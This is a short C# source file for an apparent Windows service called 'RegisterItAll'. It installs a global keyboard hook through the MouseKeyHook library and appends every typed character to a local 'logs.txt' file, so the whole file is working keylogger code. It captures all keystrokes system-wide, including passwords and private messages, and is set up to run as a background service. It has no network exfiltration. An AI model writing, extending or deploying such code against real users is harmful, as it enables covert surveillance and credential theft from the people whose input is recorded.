using Gma.System.MouseKeyHook;
using System;
using System.IO;
using System.ServiceProcess;
using System.Windows.Forms;

namespace RegisterItAll
{
    public partial class RegisterItAllService : ServiceBase
    {
        public void ExecuteAsConsoleApplication(string[] args)
        {
            this.OnStart(args);

            Console.ReadLine();

            this.OnStop();
        }

        protected override void OnStart(string[] args)
        {
            IKeyboardMouseEvents hook = Hook.GlobalEvents();

            hook.KeyPress += OnKeyPressed;

            Application.Run();
        }

        private static void OnKeyPressed(object sender, KeyPressEventArgs args)
        {
            Console.WriteLine(args.KeyChar.ToString());

            File.AppendAllText("logs.txt", args.KeyChar.ToString());
        }
    }
}